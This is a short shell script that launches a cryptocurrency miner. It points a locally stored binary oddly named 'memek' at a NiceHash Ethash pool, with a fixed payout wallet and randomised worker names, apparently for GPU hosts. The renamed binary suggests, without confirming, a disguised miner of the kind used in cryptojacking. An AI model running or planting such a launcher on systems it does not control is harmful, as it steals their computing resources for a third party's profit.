POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
WORKER=$(echo $(shuf -i 1-99999999 -n 1)-P100)
chmod +x memek
./memek --algo ETHASH --pool $POOL --user $WALLET.$WORKER
